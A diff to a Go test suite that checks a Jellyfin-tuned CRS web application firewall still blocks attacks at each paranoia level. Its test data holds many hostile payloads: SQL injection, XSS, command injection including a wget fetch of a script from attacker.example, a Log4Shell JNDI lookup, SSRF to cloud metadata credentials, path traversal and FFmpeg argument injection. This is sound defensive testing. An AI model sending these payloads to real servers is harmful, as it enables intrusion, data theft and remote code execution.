@@ -595,6 +595,14 @@ func TestTheJellyfinSetLetsItsClientsThrough(t *testing.T) {
 	}
 }
 
+// jfAttack is an attack on a Jellyfin site, and from the lowest paranoia
+// level CRS alone refuses it at. Text is sent to CRS alone at paranoia 2
+// or the set's level, whichever is lower, and a plot summary at 1.
+type jfAttack struct {
+	from int
+	r    jfRequest
+}
+
 // An attack CRS alone refuses at a level is refused with the set loaded
 // too, whether it sits in an argument the clients fill with ids and lists
 // or comes in the Authorization header. Text, which the set reads as
@@ -622,91 +630,92 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 		p[field] = value
 		return vwJSON(map[string]any{"DeviceProfile": p})
 	}
-	inText := []jfRequest{
-		{"GET", "/Items?searchTerm=" + url.QueryEscape("x' UNION SELECT Password FROM Users--") + "&recursive=true", "", "", false, c},
-		{"GET", "/Items?searchTerm=" + url.QueryEscape("<script>alert(document.cookie)</script>"), "", "", false, c},
-		{"GET", "/Items?searchTerm=" + url.QueryEscape("; cat /etc/passwd"), "", "", false, c},
-		{"GET", "/Items?genres=" + url.QueryEscape("${jndi:ldap://attacker.example/a}"), "", "", false, c},
-		{"POST", "/Playlists", js, vwJSON(map[string]any{"Name": "<script>alert(1)</script>", "Ids": []string{g.id()}}), false, c},
-		{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": "admin' OR 1=1--", "Pw": "x"}), false, c},
-		{"POST", "/Sessions/Capabilities/Full", js, device("FriendlyName", "<script>alert(1)</script>"), false, roku},
-		{"POST", "/Items/" + g.id() + "/PlaybackInfo", js, device("ModelDescription", "Type: TV; cat /etc/passwd"), false, roku},
-		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
-			uriComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/") + "&ProviderName=TheMovieDb", "", "", false, c},
-		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
-			uriComponent("https://image.example.org/t/p/original/x.jpg' UNION SELECT Password FROM Users--"), "", "", false, c},
-		{"GET", "/Items/" + g.id() + "/RemoteImages?type=Primary&ProviderName=" + uriComponent("<script>alert(1)</script>"), "", "", false, c},
-		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x",
-			"AlbumArtist": map[string]any{"Name": "x' UNION SELECT Password FROM Users--"}}), false, c},
-		{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=" + uriComponent("../../../../etc/passwd"), "text/plain", jfLRC, false, c},
+	inText := []jfAttack{
+		{1, jfRequest{"GET", "/Items?searchTerm=" + url.QueryEscape("x' UNION SELECT Password FROM Users--") + "&recursive=true", "", "", false, c}},
+		{1, jfRequest{"GET", "/Items?searchTerm=" + url.QueryEscape("<script>alert(document.cookie)</script>"), "", "", false, c}},
+		{1, jfRequest{"GET", "/Items?searchTerm=" + url.QueryEscape("; cat /etc/passwd"), "", "", false, c}},
+		{1, jfRequest{"GET", "/Items?genres=" + url.QueryEscape("${jndi:ldap://attacker.example/a}"), "", "", false, c}},
+		{1, jfRequest{"POST", "/Playlists", js, vwJSON(map[string]any{"Name": "<script>alert(1)</script>", "Ids": []string{g.id()}}), false, c}},
+		{1, jfRequest{"POST", "/Users/AuthenticateByName", js, vwJSON(map[string]any{"Username": "admin' OR 1=1--", "Pw": "x"}), false, c}},
+		{1, jfRequest{"POST", "/Sessions/Capabilities/Full", js, device("FriendlyName", "<script>alert(1)</script>"), false, roku}},
+		{1, jfRequest{"POST", "/Items/" + g.id() + "/PlaybackInfo", js, device("ModelDescription", "Type: TV; cat /etc/passwd"), false, roku}},
+		{1, jfRequest{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
+			uriComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/") + "&ProviderName=TheMovieDb", "", "", false, c}},
+		{1, jfRequest{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" +
+			uriComponent("https://image.example.org/t/p/original/x.jpg' UNION SELECT Password FROM Users--"), "", "", false, c}},
+		{1, jfRequest{"GET", "/Items/" + g.id() + "/RemoteImages?type=Primary&ProviderName=" + uriComponent("<script>alert(1)</script>"), "", "", false, c}},
+		{1, jfRequest{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x",
+			"AlbumArtist": map[string]any{"Name": "x' UNION SELECT Password FROM Users--"}}), false, c}},
+		{1, jfRequest{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=" + uriComponent("../../../../etc/passwd"), "text/plain", jfLRC, false, c}},
 	}
 	apply := func(body map[string]any) jfRequest {
 		return jfRequest{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(body), false, c}
 	}
-	inProse := []jfRequest{
-		apply(map[string]any{"Name": "x", "Overview": "<script>alert(document.cookie)</script>"}),
-		apply(map[string]any{"Name": "x", "Overview": "x' UNION SELECT Password FROM Users--"}),
-		apply(map[string]any{"Name": "x", "Overview": "Lost at sea; cat /etc/passwd"}),
-		apply(map[string]any{"Name": "x", "AlbumArtist": map[string]any{"Name": "x", "Overview": "${jndi:ldap://attacker.example/a}"}}),
+	inProse := []jfAttack{
+		{1, apply(map[string]any{"Name": "x", "Overview": "<script>alert(document.cookie)</script>"})},
+		{1, apply(map[string]any{"Name": "x", "Overview": "x' UNION SELECT Password FROM Users--"})},
+		{1, apply(map[string]any{"Name": "x", "Overview": "Lost at sea; cat /etc/passwd"})},
+		{1, apply(map[string]any{"Name": "x", "AlbumArtist": map[string]any{"Name": "x", "Overview": "${jndi:ldap://attacker.example/a}"}})},
 	}
-	attacks := []jfRequest{
-		{"GET", "/Items?userId=" + g.id() + "&fields=" + url.QueryEscape("Overview' OR '1'='1") + "&recursive=true", "", "", false, c},
-		{"GET", "/Items/" + g.id() + "/Images/Primary?tag=" + url.QueryEscape("<svg onload=alert(1)>"), "", "", true, c},
-		{"GET", "/videos/" + g.id() + "/master.m3u8?DeviceId=" + url.QueryEscape("../../../../etc/passwd") + "&api_key=" + g.id(), "", "", true, c},
-		{"GET", "/Shows/NextUp?nextUpDateCutoff=" + url.QueryEscape("2025-09-29' AND SLEEP(5)--"), "", "", false, c},
-		{"POST", "/Sessions/Playing/Progress", js, progress("ItemId", "1; wget http://attacker.example/x.sh"), false, c},
-		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "<img src=x onerror=alert(1)>"), false, c},
-		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "file:///etc/passwd"}), false, c},
+	attacks := []jfAttack{
+		{1, jfRequest{"GET", "/Items?userId=" + g.id() + "&fields=" + url.QueryEscape("Overview' OR '1'='1") + "&recursive=true", "", "", false, c}},
+		{1, jfRequest{"GET", "/Items/" + g.id() + "/Images/Primary?tag=" + url.QueryEscape("<svg onload=alert(1)>"), "", "", true, c}},
+		{1, jfRequest{"GET", "/videos/" + g.id() + "/master.m3u8?DeviceId=" + url.QueryEscape("../../../../etc/passwd") + "&api_key=" + g.id(), "", "", true, c}},
+		{1, jfRequest{"GET", "/Shows/NextUp?nextUpDateCutoff=" + url.QueryEscape("2025-09-29' AND SLEEP(5)--"), "", "", false, c}},
+		{1, jfRequest{"POST", "/Sessions/Playing/Progress", js, progress("ItemId", "1; wget http://attacker.example/x.sh"), false, c}},
+		{1, jfRequest{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "<img src=x onerror=alert(1)>"), false, c}},
+		{1, jfRequest{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "file:///etc/passwd"}), false, c}},
 		// The check for links off the site skips only a picture's one web
 		// address, on a host with a name, where a picture is taken.
-		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("ftp://attacker.example/x.jpg"), "", "", false, c},
-		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("http://intranet/x.jpg"), "", "", false, c},
-		{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("https://image.example.org/t/p/original/x.jpg") +
-			"&ImageUrl=" + uriComponent("http://attacker.example/x.txt"), "", "", false, c},
-		{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "https://image.example.org/t/p/original/x.jpg",
-			"imageUrl": "http://attacker.example/x.txt"}), false, c},
-		{"POST", "/Items/" + g.id() + "/Refresh?ImageUrl=" + uriComponent("https://attacker.example/x.txt"), "", "", false, c},
-		{"GET", "/System/Info", "", "", false, jfClient{c.userAgent,
-			`MediaBrowser Client="Jellyfin Web", Device="<script>alert(1)</script>", DeviceId="x", Version="1", Token="` + g.id() + `"`, c.deviceID, true, false, "", false}},
+		{2, jfRequest{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("ftp://attacker.example/x.jpg"), "", "", false, c}},
+		{2, jfRequest{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("http://intranet/x.jpg"), "", "", false, c}},
+		{2, jfRequest{"POST", "/Items/" + g.id() + "/RemoteImages/Download?Type=Primary&ImageUrl=" + uriComponent("https://image.example.org/t/p/original/x.jpg") +
+			"&ImageUrl=" + uriComponent("http://attacker.example/x.txt"), "", "", false, c}},
+		{2, jfRequest{"POST", "/Items/RemoteSearch/Apply/" + g.id(), js, vwJSON(map[string]any{"Name": "x", "ImageUrl": "https://image.example.org/t/p/original/x.jpg",
+			"imageUrl": "http://attacker.example/x.txt"}), false, c}},
+		{2, jfRequest{"POST", "/Items/" + g.id() + "/Refresh?ImageUrl=" + uriComponent("https://attacker.example/x.txt"), "", "", false, c}},
+		{1, jfRequest{"GET", "/System/Info", "", "", false, jfClient{c.userAgent,
+			`MediaBrowser Client="Jellyfin Web", Device="<script>alert(1)</script>", DeviceId="x", Version="1", Token="` + g.id() + `"`, c.deviceID, true, false, "", false}}},
 		// A command after the client's name. After a closing bracket only
 		// the check the set lifts off a plain User-Agent reads it.
-		{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + ";wget")},
-		{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + " `id`")},
+		{3, jfRequest{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + ";wget")}},
+		{3, jfRequest{"GET", "/UserViews?userId=" + g.uuid(), "", "", false, ua(kt.userAgent + " `id`")}},
 		// Without a character only the rules that count them see. Where
 		// the clients send ids and lists these are marked, and read as CRS
 		// reads them.
-		{"GET", "/Items?fields=" + url.QueryEscape("1 or 1") + "&recursive=true", "", "", false, c},
+		{2, jfRequest{"GET", "/Items?fields=" + url.QueryEscape("1 or 1") + "&recursive=true", "", "", false, c}},
 		// A list takes a space after a comma and nowhere else, where
 		// FFmpeg's arguments would need one.
-		{"GET", "/videos/" + g.id() + "/stream?static=false&VideoCodec=" + uriComponent("h264, hevc -f mp4 -y jellyfin.db"), "", "", false, roku},
+		{4, jfRequest{"GET", "/videos/" + g.id() + "/stream?static=false&VideoCodec=" + uriComponent("h264, hevc -f mp4 -y jellyfin.db"), "", "", false, roku}},
 		// A profile takes the one space a plus in FFmpeg's name leaves, and
 		// no option after it; its slashes are read for paths.
-		{"GET", "/videos/" + g.id() + "/master.m3u8?AudioCodec=eac3&eac3-profile=" + url.QueryEscape("dolbydigitalplus -f mp4 -y jellyfin.db"), "", "", false, c},
-		{"GET", "/videos/" + g.id() + "/master.m3u8?h264-profile=" + url.QueryEscape("high/../../../../etc/passwd"), "", "", false, c},
-		{"GET", "/Items?fields=" + url.QueryEscape("char(65)"), "", "", false, c},
-		{"GET", "/Items?parentId=" + url.QueryEscape("a);(b"), "", "", false, c},
+		{4, jfRequest{"GET", "/videos/" + g.id() + "/master.m3u8?AudioCodec=eac3&eac3-profile=" + url.QueryEscape("dolbydigitalplus -f mp4 -y jellyfin.db"), "", "", false, c}},
+		{1, jfRequest{"GET", "/videos/" + g.id() + "/master.m3u8?h264-profile=" + url.QueryEscape("high/../../../../etc/passwd"), "", "", false, c}},
+		{1, jfRequest{"GET", "/Items?fields=" + url.QueryEscape("char(65)"), "", "", false, c}},
+		{4, jfRequest{"GET", "/Items?parentId=" + url.QueryEscape("a);(b"), "", "", false, c}},
 		// Only an argument's name id is not taken for the command.
-		{"GET", "/Devices/Info?id=id", "", "", false, c},
-		{"GET", "/Devices/Info?id=" + c.deviceID + "&ls=1", "", "", false, c},
+		{3, jfRequest{"GET", "/Devices/Info?id=id", "", "", false, c}},
+		{3, jfRequest{"GET", "/Devices/Info?id=" + c.deviceID + "&ls=1", "", "", false, c}},
 		// A device's new name leaves its id to the check of shapes.
-		{"POST", "/Devices/Options?id=" + url.QueryEscape("a);(b"), js, vwJSON(map[string]any{"CustomName": "Living room TV 2"}), false, c},
-		{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "((((((((("), false, c},
-		{"POST", "/DisplayPreferences/usersettings?client=emby", js, vwJSON(map[string]any{"CustomPrefs": map[string]any{"x": `{"a":"1 or 1"}`}}), false, c},
+		{3, jfRequest{"POST", "/Devices/Options?id=" + url.QueryEscape("a);(b"), js, vwJSON(map[string]any{"CustomName": "Living room TV 2"}), false, c}},
+		{3, jfRequest{"POST", "/Sessions/Playing/Progress", js, progress("PlaySessionId", "((((((((("), false, c}},
+		{2, jfRequest{"POST", "/DisplayPreferences/usersettings?client=emby", js, vwJSON(map[string]any{"CustomPrefs": map[string]any{"x": `{"a":"1 or 1"}`}}), false, c}},
 		// Outside the arguments the set knows, text is read as CRS reads it.
-		{"GET", "/Items?userId=" + g.id() + "&overview=" + url.QueryEscape("It's a trap: 'quoted' -- (really)!"), "", "", false, c},
+		{2, jfRequest{"GET", "/Items?userId=" + g.id() + "&overview=" + url.QueryEscape("It's a trap: 'quoted' -- (really)!"), "", "", false, c}},
 		// A command in the path is read where no name goes, and a name is
 		// read for everything but commands.
-		{"GET", "/Items/" + uriComponent("x&&whoami") + "/Images/Primary", "", "", true, c},
-		{"GET", "/Persons/" + uriComponent("<script>alert(1)</script>") + "/Images/Primary", "", "", true, c},
+		{1, jfRequest{"GET", "/Items/" + uriComponent("x&&whoami") + "/Images/Primary", "", "", true, c}},
+		{1, jfRequest{"GET", "/Persons/" + uriComponent("<script>alert(1)</script>") + "/Images/Primary", "", "", true, c}},
 		// A body goes unread only as a picture where pictures go up, as
 		// lyrics where lyrics go up, and as one subtitle file in base64.
-		{"POST", "/Items/" + g.id() + "/Images/Primary", "application/x-www-form-urlencoded", "a=" + url.QueryEscape("<script>alert(1)</script>"), false, c},
-		{"POST", "/Items/" + g.id(), "image/png", g.picture(64), false, c},
-		{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=x.lrc", js, vwJSON(map[string]any{"Lyrics": "<script>alert(1)</script>"}), false, c},
-		{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": "<script>alert(1)</script>", "Format": "srt"}), false, c},
-		{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": base64.StdEncoding.EncodeToString([]byte(jfSRT)),
-			"data": "x' UNION SELECT Password FROM Users--", "Format": "srt"}), false, c},
+		{1, jfRequest{"POST", "/Items/" + g.id() + "/Images/Primary", "application/x-www-form-urlencoded", "a=" + url.QueryEscape("<script>alert(1)</script>"), false, c}},
+		{1, jfRequest{"POST", "/Items/" + g.id(), "image/png", g.picture(64), false, c}},
+		{1, jfRequest{"POST", "/Audio/" + g.id() + "/Lyrics?fileName=x.lrc", js, vwJSON(map[string]any{"Lyrics": "<script>alert(1)</script>"}), false, c}},
+		{1, jfRequest{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": "<script>alert(1)</script>", "Format": "srt"}), false, c}},
+		{1, jfRequest{"POST", "/Videos/" + g.id() + "/Subtitles", js, vwJSON(map[string]any{"Data": base64.StdEncoding.EncodeToString([]byte(jfSRT)),
+			"data": "x' UNION SELECT Password FROM Users--", "Format": "srt"}), false, c}},
 	}
+	segment := jfRequest{"GET", "/videos/" + g.id() + "/hls1/main/1.ts?MediaSourceId=" + g.id(), "", "", false, roku}
 	for pl := 1; pl <= 4; pl++ {
 		t.Run(fmt.Sprintf("paranoia %d", pl), func(t *testing.T) {
 			t.Parallel()
@@ -719,30 +728,29 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 				bareProse, _ = watchSite(t, 1, false)
 			}
 			plain, out := watchSite(t, pl, true)
-			refused := 0
-			check := func(bare string, rs []jfRequest) {
-				for _, r := range rs {
-					if jfSend(t, bare, r) != http.StatusForbidden {
-						continue
-					}
-					refused++
-					if status := jfSend(t, plain, r); status != http.StatusForbidden {
-						t.Errorf("%s %s with %.80q (%s): %d with the set, 403 without", r.method, r.path, r.body+r.client.auth, r.client.userAgent, status)
-					}
+			check := func(name, bare string, level int, as []jfAttack) {
+				for i, a := range as {
+					r := a.r
+					checkAttack(t, pl, level, a.from, fmt.Sprintf("%s[%d] %s %s with %.80q (%s)", name, i, r.method, r.path, r.body+r.client.auth, r.client.userAgent),
+						func(set bool) bool {
+							if set {
+								return jfSend(t, plain, r) == http.StatusForbidden
+							}
+							return jfSend(t, bare, r) == http.StatusForbidden
+						})
 				}
 			}
-			check(bare, attacks)
-			check(bareText, inText)
-			check(bareProse, inProse)
-			segment := jfRequest{"GET", "/videos/" + g.id() + "/hls1/main/1.ts?MediaSourceId=" + g.id(), "", "", false, roku}
+			check("attacks", bare, pl, attacks)
+			check("inText", bareText, min(pl, 2), inText)
+			check("inProse", bareProse, 1, inProse)
 			// Only the header check reads this one.
 			command := map[string]string{"Cmcd-Request": `mtp=81200,su,bl=0,nor="1.ts?a=$(id)"`}
-			if jfSendWith(t, bare, segment, command) == http.StatusForbidden {
-				refused++
-				if status := jfSendWith(t, plain, segment, command); status != http.StatusForbidden {
-					t.Errorf("a command in a CMCD header: %d with the set, 403 without", status)
+			checkAttack(t, pl, pl, 4, "a command in a CMCD header", func(set bool) bool {
+				if set {
+					return jfSendWith(t, plain, segment, command) == http.StatusForbidden
 				}
-			}
+				return jfSendWith(t, bare, segment, command) == http.StatusForbidden
+			})
 			// A device's new name is read by the rules the set leaves on
 			// text, the check for script among them.
 			rename := jfRequest{"POST", "/Devices/Options?id=" + kt.deviceID, js, vwJSON(map[string]any{"CustomName": "<img src=x onerror=alert(1)>"}), false, c}
@@ -757,9 +765,6 @@ func TestTheJellyfinSetKeepsTheAttacks(t *testing.T) {
 			})
 			if !slices.ContainsFunc(ev.Rules, func(h wafevent.Hit) bool { return h.ID == 941100 }) {
 				t.Errorf("markup in a device's new name tripped %v, not 941100", ev.Rules)
-			}
-			if total := len(attacks) + len(inText) + len(inProse); refused < total/2 {
-				t.Errorf("CRS alone refused only %d of %d attacks", refused, total)
 			}
 			if t.Failed() {
 				t.Logf("events:\n%s", events(out))
